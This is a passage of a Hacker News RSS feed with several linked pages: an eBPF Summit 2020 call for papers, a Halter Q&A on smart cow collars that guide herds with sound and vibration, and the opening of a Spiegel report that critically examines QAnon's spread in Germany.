src="https://ebpf.io/static/tomas-graf-607005c54b9411446b9574ae0f7fb082.png" alt="Tomas Graf"></p><h3>Tomas Graf</h3><div><p>Co-founder of the Cilium Project,</p><p>Isovalent</p></div></div><div><p><img src="data:image/png;base64,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" alt="Zang Li"></p><h3>Zang Li</h3><div><p>Cilium Core Team Maintainer,</p><p>Google</p></div></div></div></div><div><div><div><h2>eBPF User Lightning Talks</h2><p>Users are invited to submit talks describing how they are using eBPF and eBPF-based open source projects to solve real world problems. To be clear, you do not have to be writing raw eBPF programs yourself to speak, we expect many speakers to be leveraging eBPF via derivative projects (see list <a href="https://ebpf.io/projects">here</a>). Lightning talks will be 5 minutes in length (plus time for Q&amp;A) and can be pre-recorded or delivered live based on the speaker‚Äôs preference. We do ask that regardless of the delivery that the speaker is present to answer questions and interact with the community.</p></div><div><h2>Dates to Remember</h2><div><h4>CFP Opens: </h4><p>Wednesday, September 23</p><h4>Registration opens:</h4><p>Wednesday, September 23</p><h4>CFP Closes: </h4><p>Wednesday, October 14 at 11:59 <strong>PDT</strong></p><h4>CFP Notifications: </h4><p>on or before Friday, October 16</p><h4>Session Recordings Completed: </h4><p>Sunday, October 25th at 11:59 <strong>PDT</strong></p><h4>Event Date:</h4><p>October 28 and 29th, 2020,<br>9am-12pm <strong>PDT</strong> / 4pm-7pm <strong>GMT</strong></p></div></div></div><div><div><h2>Suggested Topics</h2><ul><li>Using eBPF to troubleshoot application and system performance</li><li>Applying eBPF to implement zero trust, runtime security, network policy</li><li>Tackling infrastructure scalability challenges with eBPF</li><li>Applying eBPF to networking and load-balancing</li><li>Application profiling and tracing with eBPF</li><li>System and application monitoring with eBPF</li><li>Unlocking new levels of observability with eBPF</li><li>Advancements in the eBPF core infrastructure and libraries</li><li>eBPF community related topics</li></ul></div><div><h2>Registration</h2><p>The summit is open to everyone free of charge. To sign up for the event, please fill out this <a href="https://docs.google.com/forms/d/e/1FAIpQLSeWBrtQzSDxgFb2yMoa2tePapMibKeGaHLHDd70xNJzzVMX5g/viewform?embedded=true">Registration Form</a>. You will receive information on how to join the summit prior to the event.</p><p>If you have any questions please ask them on <a href="https://cilium.herokuapp.com/">the eBPF Slack</a>. There is a #ebpf-summit channel dedicated for this event.</p></div></div></div></div></div></div></div></div></div>]]>
            </description>
            <link>https://ebpf.io/ebpf-summit-2020-cfp/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577647</guid>
            <pubDate>Thu, 24 Sep 2020 11:48:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Polis: real-time system for gathering, analyzing and understanding large groups]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577640">thread link</a>) | @searchableguy
<br/>
September 24, 2020 | https://pol.is/home | <a href="https://web.archive.org/web/*/https://pol.is/home">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://pol.is/home</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577640</guid>
            <pubDate>Thu, 24 Sep 2020 11:47:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Smart Cow Collars]]>
            </title>
            <description>
<![CDATA[
Score 68 | Comments 57 (<a href="https://news.ycombinator.com/item?id=24577468">thread link</a>) | @troydavis
<br/>
September 24, 2020 | https://halterhq.com/smart-cow-collars | <a href="https://web.archive.org/web/*/https://halterhq.com/smart-cow-collars">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-ca2563ba93dc6cf1ddae"><div><p>Shift, manage and monitor your herd remotely - we‚Äôve summed it up fairly concisely, but how we do that may require a little more paper and a sharpening of the pencil. How are we able to shift a cow to and from the milk shed with the click of a button? Essentially, we train cows to respond to sensory cues which help them understand where they can and cannot go, a method based on the theory of Pavlovian Conditioning. Now, it‚Äôs likely your list of questions is long, so we‚Äôve brought in our Head of Rural, Chris, who oversees all on farm training to give you some answers.</p><p><strong>You say that you use sensory cues to guide cows‚Ä¶ how does that work?</strong></p><p>Like any animal, cows learn behaviours through the use of positive and negative reinforcement. This technique is commonly known as Pavlovian Conditioning, whereby certain stimuli such as sounds, touches and smells are paired with a conditioned response in order to elicit a desired behaviour.</p><p>If you think about the way we farm today, farmers use a multitude of different cues to shift cows or keep them in a particular zone. To put it really simply, Halter replicates these cues and places them on a collar in the form of sound and vibration. </p><p>Vibration can be seen as a positive reinforcer, enabling us to shift cows around the farm as well as indicating to a cow that she is moving in the right direction. You might like to think of vibration as a farmer walking behind their cows to shift them up to the shed! Sound on the other hand helps a cow understand she is moving in the wrong direction or outside of the allocated zone. Currently on the farm an electric fence is the only real means available for farmers to keep their cows within a particular boundary; we instead use sound to replicate a fence line with a pulse used during the initial training period to help a cow understand the meaning of sound. Once the girls are trained we combine sound cues with vibration and we have the ability to guide cows around a farm, keep them out of waterways and set up virtual paddocks and break fences.</p><p><strong>How quick is the training process? Do all cows learn or do some just not get it?&nbsp;</strong></p><p>Cows are extremely quick to respond to sound, within a couple hours of wearing a collar cows learn to stay within a static boundary. It takes a little longer for them to associate vibration with positive cues, however we are currently seeing this happen within a week. In general onboarding takes a week, however this process is continually being modified and improved.</p><p>To date we haven‚Äôt come across any cows that we couldn‚Äôt train! Some learn faster than others but due to the fact that cows are herd animals, the slower ones tend to follow and learn from the faster cows.</p><p><strong>How do you ensure that the training is safe and ethical?</strong></p><p>We‚Äôve been working with animal ethics committees from the start and continue to work closely with them, along with vets and professors in this domain. Welfare is our top priority and our founding vision is to unlock the connection between animals and humans to create a better world, with the hope of not only improving the welfare of cows but other animals in the future. </p><p>We are employing a number of systems to ensure our technology is never harmful to a cow, for instance we have hardcoded mechanisms in place that will shut down a collar should anything out of the ordinary happen, for example a cow getting spooked. We have also considered the training process itself and will begin training softly until a cow becomes more comfortable. </p><p>We want to dramatically improve the welfare of cows and will never compromise their wellbeing.</p><p><strong>Will Halter work on other livestock like sheep and beef cattle? And what about calves?</strong></p><p>Absolutely. Beef cattle would be simple - it just requires a slight change in use case. Sheep would require a collar redesign to fit their small fluffy necks and, no, they are not too stupid! I am confident that the fundamental techniques will work on pretty much any mammal. Pavlovian conditioning is a concept that appeals to very basic animalistic instincts that all mammals, and most likely many other types of animals share.</p><p>In terms of calves there is no reason that Halter wouldn‚Äôt work for them, we‚Äôd just need collars small enough! Although we are currently focused on dairy cattle I see no reason why Halter wouldn‚Äôt work on other livestock in the future!</p><p>Setting up a virtual break fence, shifting cows automatically or drafting a single cow with the touch of a button sounds like a rather crazy concept, but we hope this has given you a touch of background and understanding to it all. We‚Äôll leave you to train your dogs, but trust us when we say - we‚Äôve got the cows covered.</p></div></div></div>]]>
            </description>
            <link>https://halterhq.com/smart-cow-collars</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577468</guid>
            <pubDate>Thu, 24 Sep 2020 11:20:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Most Dangerous Cult of Our Times: QAnon's Inexorable Spread Beyond the U.S.]]>
            </title>
            <description>
<![CDATA[
Score 25 | Comments 19 (<a href="https://news.ycombinator.com/item?id=24577419">thread link</a>) | @nabla9
<br/>
September 24, 2020 | https://www.spiegel.de/international/world/the-most-dangerous-cult-of-our-times-qanon-s-inexorable-spread-beyond-the-u-s-a-e2b13c80-246a-43e5-945b-80ad7767a170 | <a href="https://web.archive.org/web/*/https://www.spiegel.de/international/world/the-most-dangerous-cult-of-our-times-qanon-s-inexorable-spread-beyond-the-u-s-a-e2b13c80-246a-43e5-945b-80ad7767a170">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-article-el="body">
<section data-app-hidden="true">


</section>
<section>
<div>
<p>The path into the parallel world follows rural roads snaking through the hills of Baden-Wurttemberg to a house located on the edge of a village with a bright white fa√ßade, well-swept driveway and carefully trimmed lawn. The conspiracy has long since eaten its way into the southern German idyll. A friendly man opens the door - muscular, burly, he does a lot of lifting.</p>


<div>
<p>It was not easy to set up a meeting. He has a deep aversion to journalists and other members of a supposed elite, whom he believes are covering up a worldwide plot to oppress humanity. Over the phone, he said that he hopes to open the reporter‚Äôs eyes. "Maybe I can wake you up.‚Äù He requested that his real name not be used, so we'll call him Martin Schmidt.</p><p>"The goal of the elites is to stay powerful, to stay rich and to enslave the world,‚Äù he says.</p><p>Schmidt is 27, works as an electrician and has been living with his parents again since the beginning of the pandemic. He leads the way into the living room, with its bright tile floor and woodchip wallpaper, and says he has been thinking about the big questions for a long time. The death of John F. Kennedy, the attacks of September 11, the coronavirus pandemic: He believes they have all been faked as part of a giant plan.</p>
</div>

<p>His father nods next to him. He also believes people are being systematically deceived by politicians and members of the media. Schmidt says: "This elite, they are various men and women who work on Wall Street, to whom the banks belong, all these people.‚Äù He believes businesspeople like George Soros, Bill Gates and Mark Zuckerberg are among them, as well as the Rockefellers and the Rothschilds.</p>

<section data-area="contentbox">
<div>
<figure data-component="Image" data-settings="{&quot;id&quot;:&quot;996d8f55-bef6-471b-ad10-5c788bf27a9e&quot;, &quot;zoomable&quot;:false,&quot;zoomId&quot;:&quot;e7a12de2-75d3-4553-8079-734b91d3afd9&quot;}">
<span>
<span data-image-el="aspect">
<span>

<img data-image-el="img" src="https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w568_r0.7571817357121258_fpx50.98_fpy47.69.jpg" srcset="https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w284_r0.7571817357121258_fpx50.98_fpy47.69.jpg 284w, https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w335_r0.7571817357121258_fpx50.98_fpy47.69.jpg 335w, https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w568_r0.7571817357121258_fpx50.98_fpy47.69.jpg 568w" width="568" height="750" sizes="568px" loading="lazy" data-srcset="https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w284_r0.7571817357121258_fpx50.98_fpy47.69.jpg 284w, https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w335_r0.7571817357121258_fpx50.98_fpy47.69.jpg 335w, https://cdn.prod.www.spiegel.de/images/996d8f55-bef6-471b-ad10-5c788bf27a9e_w568_r0.7571817357121258_fpx50.98_fpy47.69.jpg 568w">
</span>
</span>
</span>
</figure>

</div>
</section>
<p>He takes out his smartphone. "I‚Äôll show you how the rich and beautiful party.‚Äù He shows a photo of performance artist Marina Abramoviƒá&nbsp;with the singer Lady Gaga at a charity event. In the picture, they are standing next to a naked female body covered with a red liquid. For Schmidt, the photo is proof of how morally degenerate the leaders of society have become, and that even the so-called elite aren‚Äôt afraid of killing people - even if, in this case, the photo is of an art performance. He says the situation is alarming. "I have awoken.‚Äù</p>

<p>Martin Schmidt is part of a growing number of QAnon sympathizers, one of tens of thousands in Germany. Followers of this right-wing conspiracy theory are convinced that an influential group of Satanist pedophiles is kidnapping boys and girls and using their blood to produce a drug. They believe that the coronavirus was developed in a Chinese lab ‚Äì possibly with the help of Barack Obama ‚Äì in order to hurt Donald Trump and prevent his reelection, a claim that is as absurd as it is false. And they believe Donald Trump is a hero fighting against the "deep state,‚Äù and that he wants to protect the world from the demonic group.</p>

<p>"He is trying to save humanity,‚Äù says Schmidt. "He will take away the elites‚Äô power.‚Äù</p>
<div>
<p>One could dismiss QAnon as crazed paranoia, like the false claims that the moon landing was faked or that the attacks of September 11th were planned by the U.S. government. But what makes the movement unique and, especially, dangerous, is its ideas.</p><p>QAnon‚Äôs followers spread disturbingly familiar themes: a supposed conspiracy of rich elites, including many Jewish businesspeople, targeting the rest of the world; a supposed group of corrupt left-wing politicians infiltrating democracies; journalists who spread propaganda as accomplices to the powerful. These centuries-old fictions from the right-wing, anti-Semitic fringe have been spread into the international public sphere via 21st-century media - part Dreyfus Affair, part Dan Brown.</p><p>"It is no exaggeration to view QAnon as a potential threat to national security,‚Äù says extremism researcher Julia Ebner from the London-based think tank Institute for Strategic Dialogue. Ebner has been researching online radicalization for years and is watching with concern as the German Q movement is becoming more independent and itself trying to recruit new followers.</p><p>Indeed, QAnon is on its way to becoming the most dangerous cult in the world ‚Äì the first ideology to come from the digital realm and to emerge from an online niche into real life, aided by Donald Trump-supporters and right-wing demagogues. The "Q‚Äù cult is fueled by one or several anonymous users who regularly post to the web and who claim to have access to top-secret U.S. government documents ‚Äì a claim that is more than questionable.</p><p>Just as disturbing is how QAnon builds on age-old anti-Semitic conspiracy theories that, centuries ago, claimed Jews drink the blood of Christians and seek to control the world. At the same time, the movement‚Äôs potential for violence is also becoming clearer. In March 2019, a QAnon believer shot an alleged mafia boss in New York because he believed the man was a member of the "deep state.‚Äù In April, U.S. police officers took a woman into custody who had threatened Hillary Clinton on Facebook because she had allegedly abused a child. In 2018, a man in Florida sent mail bombs to prominent Democrats whom he believed to be members of a "deep state" conspiracy.</p><p>The gunman in the central German city of Hanau who killed 10 people and then himself in February alluded to topics circulating in the QAnon cosmos. In a YouTube video, he argued that there were subterranean military installations in the U.S. where children are abused and killed and where the devil is worshipped.</p><p>QAnon followers also played a role in the storming of the Reichstag, the seat of German parliament, in Berlin in late August by a group protesting the authorities‚Äô measures to control COVID-19. Naturopath Tamara Kirschbaum, who called on people to run up the building‚Äôs stairs to the entrance, is identified online as a "freelance employee‚Äù of Qlobal-Change, a portal of QAnon followers. She describes herself as "the voice‚Äù of the "X22 Report,‚Äù a YouTube show about QAnon-related topics that is also translated into German. The Office for the Protection of the Constitution, the German domestic intelligence agency, in the western German state of North 